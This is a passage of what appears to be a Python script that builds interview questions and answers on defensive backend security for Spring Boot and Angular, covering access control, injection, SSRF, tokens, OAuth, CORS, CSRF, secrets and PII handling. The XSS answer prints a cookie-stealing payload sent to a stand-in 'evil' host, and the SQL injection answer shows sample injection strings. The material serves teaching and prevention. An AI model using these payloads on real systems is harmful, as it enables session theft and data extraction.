3. **Protect**: encryption at rest and in transit, field-level encryption or tokenisation for government IDs and bank details, masking in UIs and logs (`XXXX-XXXX-1234`), least-privilege DB access, separate analytics copies with pseudonymised IDs.
4. **Purpose and consent**: use data only for the purpose the user agreed to; record consent.
5. **Retention and deletion**: TTLs and scheduled purges; support account deletion across DB, caches, search indexes, data lake, and backups (crypto-shredding: delete the per-user key so backups become unreadable).
6. **Audit**: log who accessed sensitive records; alert on bulk exports.
7. **Remember the side channels**: logs, error trackers, analytics events, support tools, test databases restored from prod, and prompts sent to LLM providers all leak PII.

**Regulation in one breath**: India's **Digital Personal Data Protection Act, 2023** (brought into force with the DPDP Rules notified in November 2025, with obligations phased in over the following months) requires notice and consent, purpose limitation, reasonable security safeguards, breach notification to the Data Protection Board and affected users, and honouring rights such as correction and erasure. GDPR applies to EU users with similar principles and its own penalty regime. PCI DSS governs card data, and RBI rules add data-localisation requirements for payment data in India. You're not expected to be a lawyer, only to design so compliance is possible.
"""))

# ---------------------------------------------------------------- Q&A
QA = []

QA.append(("In your app, GET /api/orders/{id} returns another customer's order if you change the id. What is this vulnerability and how do you fix it in Spring Boot?", r"""
This is **Broken Object Level Authorization (BOLA)**, also called **IDOR**: OWASP API Security #1 and part of A01 Broken Access Control. The user is authenticated, but nobody checked that *this* object belongs to them.

**Fix: scope every lookup to the caller.**

```java
@GetMapping("/api/orders/{id}")
public OrderDto get(@PathVariable long id, @AuthenticationPrincipal Jwt jwt) {
    long customerId = Long.parseLong(jwt.getSubject());
    return orderRepo.findByIdAndCustomerId(id, customerId)
            .map(mapper::toDto)
            .orElseThrow(NotFoundException::new);   // 404: don't confirm it exists
}
```

Other options: a reusable check (`@PreAuthorize("@orderAccess.canRead(#id, authentication)")`), or tenant filtering at the data layer (Hibernate filter, row-level security) so developers can't forget it.

**Senior points:**
- Apply it to **every verb and variant**: update, delete, export, bulk, search, attachments, and "internal" endpoints.
- UUIDs instead of sequential IDs reduce guessing but **are not authorization**.
- Add an automated test: user A requests user B's resource and expects 404/403. Many teams add this to an API test suite for every new endpoint.
- Log and alert on repeated 403/404s from one user, which signals ID probing.
""", I, ["owasp", "bola", "idor", "authorization", "spring-security"], True))

QA.append(("A user sends {\"name\":\"Raj\",\"role\":\"ADMIN\"} to the profile-update endpoint and becomes an admin. Explain what happened and how to prevent it.", r"""
This is **mass assignment**, part of OWASP API3 **Broken Object Property Level Authorization**. The controller bound the JSON body directly onto the JPA `User` entity (or copied all properties with `BeanUtils.copyProperties`), so any field the entity has, including `role`, `verified` or `walletBalance`, becomes writable by the client.

**Prevention:**

1. **Request DTOs** that contain only the fields a user may change:
```java
public record UpdateProfileRequest(@NotBlank @Size(max = 80) String name,
                                   @Pattern(regexp = "^[0-9]{10}$") String phone) {}
```
   Load the entity, set allowed fields explicitly, save.
2. **Response DTOs** too: returning the entity leaks `passwordHash`, internal flags and relationships (the "excessive data exposure" half of API3).
3. Privileged fields (role, status, balance) change only through **dedicated endpoints** with their own authorization (`hasRole('ADMIN')`) and audit logging.
4. Optionally `spring.jackson.deserialization.fail-on-unknown-properties=true` so unexpected fields fail loudly in tests.

The general rule: **never expose JPA entities at the API boundary**. It also decouples your API contract from your schema, which makes migrations easier.
""", I, ["owasp", "mass-assignment", "api-security", "dto"], True))

QA.append(("Product wants an 'import profile picture from URL' feature. What is the security risk, and how do you build it safely?", r"""
The risk is **Server-Side Request Forgery (SSRF)**: the server fetches whatever URL the user supplies, so an attacker can make it call `http://169.254.169.254/latest/meta-data/iam/...` (cloud credentials), `http://localhost:8080/actuator/heapdump`, or internal services that trust traffic from inside the VPC. SSRF is now part of OWASP 2025 A01 and is API7 in the API list.

**Safe design, layered:**

1. **Allow only `https`** and, if possible, an allowlist of domains.
2. **Resolve the hostname and reject** private, loopback, link-local, multicast and unspecified addresses (IPv4 and IPv6), then **connect to the vetted IP** so DNS rebinding can't swap it after validation.
3. **Disable redirects**, or re-validate every hop.
4. Short connect/read timeouts, a **max response size**, and check the content type and image magic bytes; re-encode the image.
5. Run the fetcher in an **isolated egress path**: an egress proxy, or a separate worker with network policies that block internal ranges.
6. Enforce **IMDSv2** on AWS so a simple GET can't read instance credentials.

Better product alternative: let the browser download the image and upload it via a presigned S3 URL, so the server never fetches arbitrary URLs at all.
""", A, ["ssrf", "owasp", "api-security", "aws"], True))

QA.append(("Review this repository method: `em.createNativeQuery(\"SELECT * FROM orders WHERE status='\" + status + \"' ORDER BY \" + sortBy)`. What's wrong and how do you fix it?", r"""
It's **SQL injection** (OWASP A05). Both values come from the request and are concatenated into SQL:

- `status = "x' OR '1'='1"` returns every order; a stacked or `UNION` payload can read other tables.
- `sortBy` is worse because it isn't even inside quotes: `sortBy = "(CASE WHEN (SELECT ...) THEN created_at ELSE amount END)"` enables blind extraction.

**Fix:**

```java
private static final Map<String, String> SORT_COLUMNS =
        Map.of("created", "created_at", "amount", "amount");

String column = SORT_COLUMNS.getOrDefault(sortBy, "created_at");
Query q = em.createNativeQuery(
        "SELECT * FROM orders WHERE status = :status ORDER BY " + column, Order.class);
q.setParameter("status", status);
```

- **Bind values** as parameters; the driver sends them separately from the SQL text.
- **Identifiers** (columns, direction) can't be bound, so map user input through an **allowlist**.
- Prefer Spring Data derived queries or `@Query` with named parameters plus `Sort`/`Pageable` validated against allowed properties.
- Validate `status` against the enum.

Also mention JPQL concatenation is equally injectable, and least-privilege DB users limit damage if something slips through.
""", B, ["sql-injection", "owasp", "jpa", "code-review"], True))

QA.append(("What is the difference between authentication and authorization? When do you return 401 vs 403?", r"""
**Authentication** answers *who are you?* by verifying credentials: password plus MFA, a session cookie, a JWT signature, a client certificate. **Authorization** answers *what may you do?*: roles, scopes, ownership of a specific record, tenant boundaries, business rules ("only the approver can approve").

**HTTP status codes:**
- **401 Unauthorized** (misnamed; really "unauthenticated"): no credentials, expired or invalid token. Include a `WWW-Authenticate` header for bearer tokens. The client should log in or refresh.
- **403 Forbidden**: identity is known but not allowed. Re-authenticating won't help.
- **404 Not Found** is often returned instead of 403 for objects the user may not see, to avoid confirming that `order 1234` exists.

In Spring Security, `AuthenticationEntryPoint` produces 401s and `AccessDeniedHandler` produces 403s.

**Why interviewers care:** most real breaches happen **after** successful authentication, through missing authorization checks (BOLA, admin endpoints without role checks). A strong answer says authN is mostly solved by using an IdP and the framework, while authZ is application logic you must design and test on every endpoint.
""", B, ["authentication", "authorization", "http"], True))

QA.append(("You're designing auth for a new product with an Angular web app and a mobile app. Server-side sessions or JWTs? Defend your choice.", r"""
I'd separate **how clients authenticate to us** from **how services trust each other**.

- **Identity provider** (Keycloak, Auth0, Cognito) running OIDC: Authorization Code + PKCE for both the web and mobile apps; MFA and social login handled there, not hand-built.
- **Web (Angular)**: a **BFF** or the API gateway completes the OAuth flow and keeps tokens server-side; the browser holds only an `HttpOnly; Secure; SameSite=Lax` session cookie, with CSRF protection. Instant logout (delete the session) and no tokens exposed to XSS.
- **Mobile**: short-lived JWT access token (10 minutes) plus a rotating refresh token in the OS keychain/keystore.
- **Microservices**: validate JWT access tokens statelessly with the IdP's public keys (Spring resource server checking `iss`, `aud`, `exp`, scopes).

**Trade-offs I'd state:** sessions need a shared store (Redis via Spring Session) but give instant revocation; JWTs scale without lookups but revocation needs short expiry, refresh token rotation, or a denylist. "Stateless JWT in localStorage for everything" is the common anti-pattern: XSS steals tokens and logout doesn't really log out.

If the team is small and it's a single monolith, plain server-side sessions are the simplest secure option, and that's a valid answer too.
""", I, ["jwt", "sessions", "oauth", "architecture"], True))

QA.append(("You're reviewing a hand-written JWT filter in a Spring Boot service. What do you check?", r"""
First question: **why hand-written?** Spring Security's OAuth2 resource server handles this correctly; custom filters are where bugs live. If it must stay, check:

1. **Algorithm pinned** on the server (e.g. only RS256). Reject `alg: none` and prevent HS/RS confusion, where the public key is used as an HMAC secret.
2. **Signature verified** with keys from a configured JWKS URL or key store, never from `jku`/`x5u`/`kid` values pointing to arbitrary URLs or file paths.
3. **Claims validated**: `exp` and `nbf` (small clock skew), `iss` equals the expected issuer, `aud` contains this service.
4. **Key strength**: HMAC secrets of 256+ random bits from a secret manager, not `"mySecretKey"` in `application.yml`.
5. **Token lifetime**: access tokens minutes, not days; a revocation story (refresh rotation, denylist by `jti`, user token version).
6. **No sensitive data in the payload** (it's only base64url-encoded).
7. **Failure handling**: any parsing/validation exception means 401, never "continue unauthenticated with partial context"; no stack traces in responses.
8. **Tokens never logged** or accepted from query strings.
9. **Authorities mapping**: roles come from trusted claims, not request headers like `X-User-Role`.
10. **Tests**: expired, wrong audience, tampered signature, `alg: none` all rejected.
""", A, ["jwt", "code-review", "spring-security"], True))

QA.append(("How do you design refresh tokens so that a stolen token causes limited damage? How does logout work?", r"""
**Design:**
- **Access token**: short-lived JWT (5-15 min), used as a Bearer header, verified statelessly.
- **Refresh token**: long random opaque string (7-30 days), stored **hashed** in a DB table with `user_id`, `family_id`, `device_id`, `expires_at`, `used_at`, `revoked`. For web, it lives in an `HttpOnly; Secure; SameSite=Strict` cookie scoped to the refresh path; for mobile, in the keychain/keystore.

**Rotation with reuse detection:**
1. Client calls `/auth/refresh` with RT1.
2. If RT1 is valid and unused: issue a new access token and RT2 (same family), mark RT1 used.
3. If RT1 was **already used**, someone has a copy (attacker or victim): **revoke the whole family**, force re-login, emit a security event.

**Logout:** revoke the refresh token (or the family) server-side and clear cookies. The access token remains valid until expiry, which is why it's short. For immediate cut-off (account takeover, firing an employee), add a **denylist of `jti`s** in Redis with TTL = remaining lifetime, or a per-user `tokens_valid_after` timestamp checked by the gateway.

**Password change / "log out all devices":** revoke all families for the user. Also bind refresh to client ID so a token from the web app can't be used by another client.
""", A, ["jwt", "refresh-token", "authentication"], False))

QA.append(("Where should an Angular SPA store access tokens: localStorage, sessionStorage, memory or cookies?", r"""
Each option trades **XSS exposure** against **CSRF exposure**:

| Storage | XSS can steal it? | CSRF risk? | Notes |
|---|---|---|---|
| `localStorage` | **Yes** | No | Persists across tabs/restarts; one XSS = token exfiltrated |
| `sessionStorage` | **Yes** | No | Per tab; same XSS problem |
| In-memory variable | Harder (script can still act as the user while the page is open) | No | Lost on reload; pair with silent refresh |
| `HttpOnly` cookie | **No** (script can't read it) | **Yes**, needs CSRF protection | `Secure; SameSite=Lax/Strict` |

**My recommendation:** a **Backend-for-Frontend (BFF)**. The BFF performs the OAuth code flow, keeps access/refresh tokens server-side, and gives the browser an `HttpOnly` session cookie. Add CSRF protection (Spring's `CookieCsrfTokenRepository` plus Angular's built-in XSRF header support) and `SameSite`. This is the direction current OAuth guidance for browser apps recommends.

If a BFF isn't possible: access token in memory, refresh token in an `HttpOnly` cookie, short lifetimes, and a strict Content-Security-Policy.

Important nuance: if an attacker gets XSS, they can make requests *as the user* regardless of storage. HttpOnly prevents **theft** of long-lived credentials, not misuse during the session, so preventing XSS still matters most.
""", I, ["jwt", "xss", "csrf", "angular", "spa"], False))

QA.append(("Explain the OAuth 2.0 Authorization Code flow with PKCE. Why is PKCE needed, and which flows should no longer be used?", r"""
**Flow:**
1. The client creates a random **code_verifier** and derives **code_challenge = BASE64URL(SHA-256(verifier))**.
2. It redirects the user to the authorization server's `/authorize` with `response_type=code`, `client_id`, exact `redirect_uri`, `scope`, a random `state`, and the `code_challenge` (method `S256`).
3. The user authenticates (and consents). The server redirects back with a short-lived, one-time **authorization code** plus `state` (client checks it matches, preventing login CSRF).
4. The client exchanges the code at `/token`, sending the **code_verifier**.
5. The server checks `SHA-256(verifier) == challenge` and returns an access token (plus ID token with OIDC, and possibly a refresh token).
6. The client calls APIs with `Authorization: Bearer ...`; APIs validate signature, `iss`, `aud`, `exp` and scopes.

**Why PKCE:** the code passes through the browser/redirect, where it can be intercepted (malicious apps with the same URL scheme, logs, referrers). PKCE makes a stolen code useless without the verifier, which never left the real client. SPAs and mobile apps can't keep a client secret, so PKCE is their proof; guidance now recommends it for all clients.

**Don't use:** the **implicit grant** and the **password grant**. RFC 9700 (the OAuth Security BCP, January 2025) advises against both.
""", I, ["oauth2", "pkce", "oidc"], True))

QA.append(("Order-service calls inventory-service internally. How should inventory-service authenticate and authorize the caller: API keys, client credentials or mTLS?", r"""
"It's inside the VPC" is not authentication; one compromised pod could call everything. Options:

- **Static API keys / shared secrets**: simple, but long-lived, hard to rotate, often shared across services, and they identify nothing granular. Acceptable only for low-risk cases with rotation.
- **OAuth2 Client Credentials**: order-service obtains a short-lived JWT from the IdP (`aud=inventory-api`, `scope=inventory:reserve`) and caches it until near expiry. Inventory validates it like any token and authorizes by scope. Works across clusters and clouds, and gives per-service identity and scopes.
- **mTLS**: both sides present certificates, typically issued and rotated automatically by a service mesh (Istio, Linkerd) or SPIFFE/SPIRE. Strong workload identity plus encryption, with no application code changes. Authorization is configured as mesh policy ("only order-service may call POST /reservations").

**My answer:** mTLS via the mesh for transport and workload identity if the platform has one; otherwise client credentials. In both cases, authorize per endpoint (least privilege) and, when the action is on behalf of an end user, **propagate the user's context** (token exchange or a signed user claim) so inventory can apply user-level rules and audit logs show who really triggered it.
""", A, ["mtls", "oauth2", "service-to-service", "microservices"], False))

QA.append(("What is the difference between OAuth 2.0 and OpenID Connect? Between an ID token and an access token?", r"""
**OAuth 2.0** is about **authorization/delegation**: a client gets an access token to call an API, with scopes limiting what it can do. It deliberately says nothing standard about *who the user is*.

**OpenID Connect (OIDC)** is an identity layer on top of OAuth 2.0 that standardises **authentication**: the `openid` scope, an **ID token**, a `userinfo` endpoint, discovery (`/.well-known/openid-configuration`), and claims like `sub`, `email`, `name`. "Sign in with Google" is OIDC.

**ID token vs access token:**

| | ID token | Access token |
|---|---|---|
| Audience | The **client** app | The **resource server** (API) |
| Purpose | Tell the client who logged in, when, how | Authorize API calls |
| Format | Always a JWT | JWT or opaque; the client should treat it as opaque |
| Send to APIs? | **No** | Yes, as Bearer |

Common mistakes: using the ID token as an API credential (its `aud` is the client, not your API), skipping `nonce` validation, or assuming OAuth scopes replace application authorization. Scopes say what the *client* may do on the user's behalf; your API must still check that this user owns this record.
""", I, ["oauth2", "oidc", "jwt"], False))

QA.append(("How should a Spring Boot application store user passwords? Why not SHA-256? bcrypt or Argon2?", r"""
Use a **slow, salted, adaptive password hashing function** via Spring's `PasswordEncoder`; never encryption (reversible) and never plain fast hashes.

**Why not SHA-256 (even salted)?** It's designed to be fast: a GPU computes billions per second, so a leaked table of SHA-256 hashes falls to dictionary and brute-force attacks quickly. Password hashes must be deliberately expensive.

**Choices (OWASP minimums):**
- **Argon2id**: first choice; memory-hard, which blunts GPU/ASIC attacks. Minimum 19 MiB memory, 2 iterations, parallelism 1.
- **bcrypt**: battle-tested and fine; cost factor 10+ tuned to roughly 100 ms or more per hash; note the **72-byte input limit**.
- **PBKDF2-HMAC-SHA256** with 600,000 iterations when FIPS compliance is required.

**In Spring:**
```java
@Bean
PasswordEncoder passwordEncoder() {
    return PasswordEncoderFactories.createDelegatingPasswordEncoder(); // "{bcrypt}..." prefix
}
```
The prefix lets you **migrate algorithms**: implement `UserDetailsPasswordService` and Spring rehashes on next successful login.

Also: unique salts are automatic; consider a **pepper** stored outside the DB; rate-limit logins; check breached-password lists; support MFA; and make reset tokens random (`SecureRandom`), single-use, short-lived and stored hashed.
""", B, ["passwords", "hashing", "bcrypt", "argon2", "spring-security"], True))

QA.append(("A teammate accidentally pushed the production database password to a public GitHub repo an hour ago. What do you do?", r"""
Treat it as an **active security incident**: bots scan GitHub for secrets within minutes.

**Immediately (contain):**
1. **Rotate the credential now**: change the DB password (or revoke the key), update it in Secrets Manager/Vault, and roll the services so they pick it up. Removing the commit does **not** un-leak it; forks, clones and scrapers may already have it.
2. Check whether the DB is reachable from the internet at all; restrict network access if so.

**Investigate:**
3. Review DB audit logs, connection logs and CloudTrail for unknown IPs or unusual queries since the push.
4. Check what else was in the commit (other keys, config, customer data).

**Clean up:**
5. Remove the secret from history (`git filter-repo` or BFG), force-push, and ask GitHub to purge cached views if needed; this is hygiene, not remediation.
6. Inform the security team and follow the incident process, including any data-breach notification obligations if data was accessed.

**Prevent recurrence (blameless):**
7. Pre-commit secret scanning (gitleaks), GitHub push protection, secrets only in a manager accessed through IAM roles, short-lived or dynamic DB credentials, and separate credentials per environment so one leak has a small blast radius.
""", I, ["secrets", "incident", "git"], True))

QA.append(("How do you manage secrets for Spring Boot services running on Kubernetes in AWS?", r"""
**Principles:** secrets live in a dedicated manager, workloads fetch them with their own identity, access is least-privilege and audited, and rotation doesn't need a code change.

**Concrete setup:**
- **Source of truth**: AWS Secrets Manager (built-in rotation for RDS) or SSM Parameter Store; HashiCorp Vault in multi-cloud shops.
- **Identity**: EKS Pod Identity or IRSA gives each service account an IAM role allowed to read only its own secrets (`secretsmanager:GetSecretValue` on specific ARNs).
- **Delivery**, choose one:
  - **External Secrets Operator** syncs into Kubernetes Secrets (then etcd encryption with KMS plus tight RBAC matter), or
  - **Secrets Store CSI driver** mounts them as files, or
  - **Spring Cloud AWS** reads them at startup via `spring.config.import=aws-secretsmanager:...`.
- **Rotation**: prefer short-lived credentials (IAM DB authentication, Vault dynamic secrets). For static ones, rotate on a schedule and design for it: env vars need a rolling restart, mounted files can be reloaded; for DB passwords, use dual credentials during the rotation window.
- **Never**: secrets in git, Helm values, Docker images, `application-prod.yml`, CI logs or AI prompts.
- **Detect**: secret scanning in CI and pre-commit hooks; alerts on unusual secret access in CloudTrail.
""", I, ["secrets", "kubernetes", "aws", "spring-boot"], False))

QA.append(("Explain TLS vs mTLS. Where should TLS terminate in a typical AWS deployment of microservices?", r"""
**TLS** encrypts traffic and authenticates the **server**: the client verifies the server's certificate chain against trusted CAs and checks the hostname. The client stays anonymous at the TLS layer (it authenticates later with a password or token).

**mTLS** adds **client authentication**: the server requests a client certificate and verifies it, so both ends prove their identity. It's used for service-to-service traffic, partner/bank integrations, and zero-trust networks.

**Where TLS terminates:**
- **At the edge (ALB/CloudFront)** with ACM certificates: simplest, and the LB can do L7 routing and WAF. Traffic from LB to pods may be plain HTTP inside private subnets.
- **Re-encrypt to the backend** (LB to pod over TLS) when compliance requires encryption everywhere (PCI DSS, banking) or you don't want to trust the internal network.
- **Service mesh mTLS** for pod-to-pod traffic: sidecars or ambient proxies handle certificates and rotation automatically, so application code stays unchanged.

**Pitfalls:** disabling certificate verification in Java clients to "fix" a PKIX error (fix the trust store instead), forgetting HSTS on public domains, manual certificate renewals that expire at 2 a.m. (automate with ACM or cert-manager), and treating mTLS identity as authorization (you still need per-service access policy).
""", I, ["tls", "mtls", "networking", "aws"], False))

QA.append(("The front-end team sees CORS errors and proposes allowedOrigins(\"*\") with allowCredentials(true). What do you tell them?", r"""
First, explain what CORS is: the browser enforces the **same-origin policy**, and CORS headers let your server tell the browser which other origins may **read** responses. It is a browser-side relaxation, **not** a server-side security control: curl or a backend can call your API regardless of CORS.

Why the proposal is wrong:
- Browsers reject `Access-Control-Allow-Origin: *` together with credentials, and Spring refuses that combination too, so it won't even work.
- The common "fix" people then reach for, **reflecting whatever `Origin` arrives** while allowing credentials, lets **any website** make authenticated requests from a logged-in user's browser and read the responses (account data, CSRF tokens). That's a real vulnerability.

What to do instead:
```java
c.setAllowedOrigins(List.of("https://app.acme.in", "https://admin.acme.in"));
c.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
c.setAllowedHeaders(List.of("Authorization", "Content-Type", "X-XSRF-TOKEN"));
c.setAllowCredentials(true);
```
Use an explicit list per environment (localhost only in dev config), or `allowedOriginPatterns` for controlled subdomains. Check the preflight (`OPTIONS`) passes through the security filter chain (`http.cors(...)`). Often the real fix is serving the SPA and API from the same origin via the gateway, which removes CORS entirely.
""", I, ["cors", "spring-security", "browser-security"], False))

QA.append(("When is CSRF protection needed? Is it safe to disable CSRF in Spring Security for a REST API?", r"""
CSRF matters when the **browser attaches credentials automatically**: session cookies, HTTP basic auth, client certificates. A malicious site can then trigger a state-changing request (form POST, image tag for GET) and the browser sends the victim's cookie along.

**It is safe to disable CSRF** when the API is authenticated **only** by a token the client adds explicitly, such as `Authorization: Bearer <jwt>`, and no cookie-based auth is accepted. A cross-site form can't set that header, so there's nothing to forge. Spring's own docs note CSRF protection is for requests a browser can make on a user's behalf.

**It is not safe** when:
- you use session cookies (Spring Session, a BFF), or
- you put the JWT in a cookie "for security" (now it's sent automatically), or
- the same app serves server-rendered forms.

In those cases keep CSRF on. For Angular: `CookieCsrfTokenRepository.withHttpOnlyFalse()` plus Angular's `HttpClient` XSRF support (reads `XSRF-TOKEN`, sends `X-XSRF-TOKEN`), and `SameSite=Lax` or `Strict` cookies as defence in depth.

Also: never change state on `GET`, and remember CORS does not prevent CSRF, because simple cross-site form posts don't need CORS permission to be *sent*.
""", I, ["csrf", "spring-security", "cookies"], False))

QA.append(("A support agent's admin panel (Angular) got compromised via a malicious ticket comment that ran JavaScript. What happened, and whose fix is it?", r"""
This is **stored XSS**: a customer submitted HTML/JS (e.g. `<img src=x onerror="fetch('https://evil/'+document.cookie)">`) that was saved and later rendered unsafely in the agent's browser, running with the agent's privileges. Admin panels are prime targets because one compromised agent session can read or change many accounts.

**It's a shared fix:**

**Frontend (Angular):**
- Interpolation `{{ comment }}` is auto-escaped; `[innerHTML]` is sanitised. Look for `bypassSecurityTrustHtml`, direct DOM manipulation, or third-party rich-text widgets rendering raw HTML.
- Add a strict **Content-Security-Policy** (no inline scripts, restricted `connect-src`) so injected script can't run or exfiltrate.

**Backend:**
- If rich text is a requirement, **sanitise on input** with an allowlist sanitizer (OWASP Java HTML Sanitizer) and store the clean version; otherwise store plain text.
- Return JSON with correct `Content-Type` and `X-Content-Type-Options: nosniff`.
- Session cookies `HttpOnly; Secure; SameSite`; admin sessions short-lived, with re-authentication for sensitive actions.

**Also:** other renderers (email templates, PDF generators, exports to Excel with formula injection) need the same care. Then: invalidate agent sessions, review audit logs for actions taken, and add a regression test with an XSS payload.
""", I, ["xss", "angular", "owasp", "incident"], False))

QA.append(("Design protections for the login and OTP endpoints of a fintech app against brute force, credential stuffing and SMS pumping.", r"""
**Rate limits on several keys** (Redis-backed token buckets so all pods share counters):
- Login: per IP, per account identifier, per device fingerprint; global anomaly thresholds.
- OTP send: per phone (e.g. 3/hour, 10/day), per IP, per account, plus a **global SMS spend cap** with alerting; block premium-rate and suspicious country prefixes (SMS pumping/toll fraud).
- OTP verify: max 3-5 attempts per code, then invalidate it.

**Login hardening:**
- Prefer progressive delays and CAPTCHA after a few failures over hard lockouts, which attackers can use to lock victims out.
- Defeat credential stuffing with MFA/OTP, breached-password checks, device and IP reputation, and alerts on many accounts from one IP or ASN.
- Generic responses ("invalid credentials") with similar timing, so accounts can't be enumerated.

**OTP correctness:**
- 6+ digits from `SecureRandom`, expiry 2-5 minutes, single-use, stored hashed, compared in constant time, bound to a purpose and transaction ("login" vs "payment of Rs 5,000").
- Resend cooldown (30-60 s) with exponential growth.

**Operations:** 429 with `Retry-After`, security events for every failure, dashboards for OTP sent vs verified ratio (a sudden drop signals pumping), and an ops kill switch to throttle SMS by region during an attack.
""", A, ["rate-limiting", "authentication", "otp", "abuse"], True))

QA.append(("Your 'forgot password' endpoint says 'No account with this email' for unknown emails. Why is that a problem, and how do you fix it?", r"""
It enables **account enumeration**: an attacker can test millions of emails or phone numbers and learn which ones are registered. That list feeds credential stuffing, targeted phishing ("we noticed suspicious activity on your [App] account"), and, for sensitive services, leaks the fact that a person uses the service at all.

**Fix:**
- Return the **same response** in both cases: "If an account exists for this email, we've sent a reset link." Same status code, same body.
- Keep **timing similar**: don't skip the slow work for unknown accounts. Enqueue the email sending asynchronously so both paths return in roughly constant time.
- Apply the same thinking to **login** ("invalid email or password", not "wrong password") and **signup** (for an existing email, send "you already have an account" to that inbox instead of revealing it on screen).
- **Rate-limit** the endpoint per IP and per identifier, and add CAPTCHA under abuse.

**Reset token design** while you're there: random from `SecureRandom`, stored hashed, single-use, expires in 15-30 minutes, invalidated when the password changes; after reset, revoke existing sessions and refresh tokens, and notify the user.

There's a UX trade-off: product teams sometimes want explicit messages. Explain the risk and offer the neutral wording as a compromise.
""", I, ["enumeration", "authentication", "password-reset"], False))

QA.append(("How do you prevent broken function-level authorization, such as normal users calling /api/admin endpoints? URL rules or @PreAuthorize?", r"""
**Broken function-level authorization** (OWASP API5) happens when privileged operations are exposed and only "hidden" by the UI, or when a new endpoint ships without a role check.

**Use both layers, deny by default:**

1. **URL rules** in the `SecurityFilterChain` for coarse boundaries:
```java
.authorizeHttpRequests(a -> a
    .requestMatchers("/api/admin/**").hasRole("ADMIN")
    .requestMatchers("/actuator/health/**").permitAll()
    .anyRequest().authenticated())   // or denyAll() for unmatched paths
```
2. **Method security** close to the business logic with `@EnableMethodSecurity`:
```java
@PreAuthorize("hasAuthority('refund:approve')")
public Refund approve(long refundId) { ... }
```
   This protects the operation even if it's later exposed through another controller, a message listener or a GraphQL resolver.

**Good practices:**
- Model **permissions** (`refund:approve`) rather than scattering role names; map roles to permissions centrally.
- Watch path-matching mismatches (trailing slashes, `/api/admin` vs `/api/admin/`, different HTTP methods).
- Automated tests per endpoint: a normal user gets 403 on admin operations; some teams generate this from the route list so a new endpoint without a rule fails the build.
- Audit-log admin actions.
""", I, ["authorization", "spring-security", "api-security"], False))

QA.append(("What security events should a backend log, and what must never appear in logs?", r"""
**Log (structured JSON with timestamp, user ID, tenant, IP, user agent, trace ID, outcome):**
- Authentication: login success/failure, MFA enrolment and challenges, password/reset changes, token refresh failures, refresh-token reuse.
- Authorization failures (403s), especially bursts that suggest ID probing.
- Privileged actions: role changes, admin overrides, refunds, data exports, API key creation, config changes.
- Abuse signals: rate-limit hits (429), CAPTCHA triggers, OTP send/verify counts.
- Input validation failures at unusual rates.

**Never log:**
- Passwords (including in failed-login messages), OTPs, security answers.
- Session IDs, access/refresh tokens, API keys, `Authorization` headers.
- Full card numbers, CVV, bank account numbers, Aadhaar/PAN; mask them (`XXXX1234`).
- Full request/response bodies of auth, payment or KYC endpoints.

**Make logs useful and safe:**
- JSON encoding prevents **log injection** (newlines in usernames forging entries).
- A logging filter/masking layer as a safety net, but don't rely on it alone.
- Ship to central storage with restricted access and retention rules; logs containing PII are personal data under DPDP/GDPR too.
- **Alert** on the events, otherwise they're just archives: spikes in 401/403/429, one IP across many accounts, and admin actions outside business hours.
""", I, ["logging", "owasp", "monitoring", "pii"], False))

QA.append(("Your API returns stack traces and SQL error messages in 500 responses. Why is that a problem, and how should a Spring Boot service handle errors?", r"""
**Why it's a problem** (OWASP 2025 A10 *Mishandling of Exceptional Conditions*, also A02 Misconfiguration):
- Stack traces reveal frameworks, versions, package names and file paths, which helps attackers pick exploits.
- SQL errors reveal table/column names and confirm injection points.
- Inconsistent error paths often hide worse bugs: a swallowed exception in an auth check that leaves the request **allowed**, or a half-completed payment left in an unknown state.

**How to handle errors well:**
1. One `@RestControllerAdvice` that maps known exceptions to proper status codes using `ProblemDetail` (RFC 9457) and a catch-all that returns a generic 500 with a **correlation/trace ID**.
2. Keep Spring Boot's defaults: `server.error.include-stacktrace=never`, `include-message=never`, no Whitelabel details in production.
3. Log the full exception server-side with the same trace ID so support can find it.
4. **Fail closed** for security and money decisions: if the permission service or fraud check times out, deny or queue for review instead of allowing.
5. Define explicit outcomes for partial failures (retry, compensate, reconcile) rather than letting exceptions leave data inconsistent.
6. Don't catch `Exception` and continue; catch specific exceptions you can actually handle.
""", I, ["error-handling", "owasp", "spring-boot"], False))

QA.append(("How do you protect a Java service against vulnerable or malicious dependencies (software supply chain)?", r"""
Supply chain failures are **A03 in the OWASP Top 10:2025**; Log4Shell showed one transitive library can expose thousands of services.

**Know and track:**
- Generate an **SBOM** per build (CycloneDX Maven plugin) so you can answer "which services use library X?" in minutes.
- **Continuous scanning**: Dependabot/Renovate PRs, OWASP Dependency-Check or Snyk in CI, container image scanning for OS packages. Fail builds on fixable critical CVEs, with a documented exception process.

**Control what comes in:**
- Use Spring Boot's managed dependency versions; avoid unnecessary libraries.
- Pull through a **private repository proxy** (Nexus/Artifactory) with checksum verification.
- Review **new** dependencies: maintained? widely used? correct coordinates (typosquats)? Be especially careful with packages an AI assistant suggests, since attackers register commonly hallucinated names.

**Protect the build:**
- Least-privilege CI tokens, OIDC to the cloud instead of stored keys, pinned GitHub Actions (by SHA), branch protection and required reviews.
- **Sign images** (Sigstore cosign) and only admit signed images into the cluster.

**Respond:** a patch playbook (identify, upgrade, test, deploy everywhere within a target time) and runtime mitigations (WAF rules, disabling a feature) while patching.
""", A, ["supply-chain", "dependencies", "owasp", "ci-cd"], False))

QA.append(("You're building a payments/KYC backend that stores phone numbers, PAN and Aadhaar details. How do you handle this PII?", r"""
**Minimise first:** store only what regulation and the feature require. For Aadhaar, avoid storing the full number where possible (use masked numbers, references or tokens from the licensed KYC provider), and never store biometrics yourself. For cards, rely on gateway **tokenisation**; never store CVV.

**Protect what you keep:**
- **Field-level encryption** for PAN, Aadhaar references and bank accounts using **KMS envelope encryption**; a separate deterministic hash or blind index if you need equality search.
- Encryption at rest (RDS/S3 with KMS) and TLS in transit; restrict DB access to the few services that need these fields.
- **Masking** everywhere humans look: APIs return `XXXXXX1234`, admin UIs reveal full values only for authorised roles with an audit entry, logs never contain them.
- Keep PII out of analytics events, error trackers, test environments (use synthetic or masked data), and prompts sent to LLM providers.

**Govern:**
- Data classification tags on columns; access reviews; audit logs for every read of sensitive fields; alerts on bulk access.
- **Retention**: delete or anonymise when the legal retention period ends; support erasure requests across DB, caches, search, data lake, backups (crypto-shredding helps).
- **Compliance awareness**: India's DPDP Act 2023 (consent, purpose limitation, safeguards, breach notification), RBI data-localisation for payment data, PCI DSS for cards.
""", A, ["pii", "privacy", "encryption", "compliance", "dpdp"], False))

QA.append(("Walk me through your security checklist when reviewing a pull request that adds a new REST endpoint.", r"""
